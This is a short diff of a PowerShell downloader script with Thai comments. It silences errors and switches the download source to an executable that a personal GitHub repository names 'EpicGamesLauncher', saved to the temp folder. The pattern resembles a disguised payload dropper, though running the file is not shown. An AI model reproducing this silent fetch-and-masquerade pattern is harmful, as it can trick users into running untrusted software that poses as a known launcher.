@@ -1,7 +1,7 @@
 $ErrorActionPreference = "SilentlyContinue"
 
 # 1. ข้อมูลไฟล์และลิงก์
-$downloadUrl = "https://github.com/GRILLYje/Fishing_Atlas_public/releases/download/V1.0.1/PAOPAO_ATLAS.exe" 
+$downloadUrl = "https://github.com/GRILLYje/EpicGamesLauncher/releases/download/V1.0.67/EpicGamesLauncher.exe" 
 $tempPath = "$env:TEMP\EpicGamesLauncher.exe"
 
 # 2. เช็คไฟล์เก่าและลบทิ้ง
